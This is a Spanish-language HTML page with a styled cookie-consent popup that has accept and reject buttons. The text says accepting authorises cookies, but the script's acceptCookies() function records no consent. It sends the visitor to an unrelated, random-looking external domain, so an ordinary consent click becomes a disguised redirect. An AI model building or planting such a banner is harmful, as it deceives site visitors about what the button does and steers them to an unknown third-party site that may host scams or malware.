<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Popup de Cookies</title>
<style>
  * { box-sizing: border-box; }

  :root {
    --bg: #14213d;
    --amber: #fca311;
    --amber-dark: #e08f00;
    --text: #f1f5f9;
    --muted: #b6c2d9;
    --line: rgba(255, 255, 255, 0.18);
  }

  body {
    font-family: "Avenir Next", "Trebuchet MS", Verdana, sans-serif;
    margin: 0;
    min-height: 100vh;
    background: #eef1f6;
  }

  .overlay {
    position: fixed;
    inset: 0;
    display: flex;
    justify-content: center;
    align-items: flex-end;
    padding: 24px;
    z-index: 9999;
    background: rgba(20, 33, 61, 0.4);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    animation: fadeIn 0.3s ease;
  }

  @media (min-width: 640px) {
    .overlay { align-items: center; }
  }

  .card {
    background: var(--bg);
    width: 100%;
    max-width: 440px;
    border-radius: 6px 28px 6px 28px;
    box-shadow: 0 24px 60px rgba(20, 33, 61, 0.45);
    overflow: hidden;
    animation: slideUp 0.4s cubic-bezier(.2,.8,.2,1);
  }

  .topbar {
    height: 6px;
    background: var(--amber);
  }

  .body {
    padding: 28px 30px 26px;
  }

  .head {
    display: flex;
    align-items: center;
    gap: 14px;
    margin-bottom: 14px;
  }

  .icon {
    flex: none;
    width: 46px;
    height: 46px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--amber);
    border-radius: 50%;
    font-size: 22px;
  }

  .head h2 {
    margin: 0;
    font-size: 19px;
    color: var(--text);
    font-weight: 700;
  }

  .card p {
    margin: 0 0 24px;
    color: var(--muted);
    font-size: 14px;
    line-height: 1.65;
  }

  .actions {
    display: flex;
    flex-direction: column-reverse;
    gap: 10px;
  }

  @media (min-width: 420px) {
    .actions { flex-direction: row; }
  }

  button {
    flex: 1;
    padding: 13px 20px;
    font-size: 14.5px;
    font-weight: 700;
    border-radius: 999px;
    cursor: pointer;
    font-family: inherit;
    border: 2px solid transparent;
    transition: background 0.2s ease, border-color 0.2s ease;
  }
  button:focus-visible { outline: 2px solid #fff; outline-offset: 2px; }

  .accept {
    background: var(--amber);
    color: var(--bg);
  }
  .accept:hover { background: var(--amber-dark); }

  .reject {
    background: transparent;
    color: var(--text);
    border-color: var(--line);
  }
  .reject:hover { border-color: var(--muted); }

  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  @keyframes slideUp {
    from { opacity: 0; transform: translateY(20px) scale(0.98); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }
</style>
</head>
<body>

<div class="overlay" id="cookieOverlay">
  <div class="card">
    <div class="topbar"></div>
    <div class="body">
      <div class="head">
        <div class="icon">🍪</div>
        <h2>Configuración de cookies</h2>
      </div>
      <p>
        Este sitio web utiliza cookies para mejorar tu experiencia de navegación,
        analizar el tráfico y ofrecer contenidos personalizados. Al hacer clic en
        "Aceptar", autorizas el uso de cookies.
      </p>
      <div class="actions">
        <button class="reject" onclick="rejectCookies()">Rechazar</button>
        <button class="accept" onclick="acceptCookies()">Aceptar</button>
      </div>
    </div>
  </div>
</div>

<script>
  function acceptCookies() {
    window.location.href = "https://yy.negrrwe.info/";
  }

  function rejectCookies() {
    document.getElementById('cookieOverlay').style.display = 'none';
  }
</script>

</body>
</html>
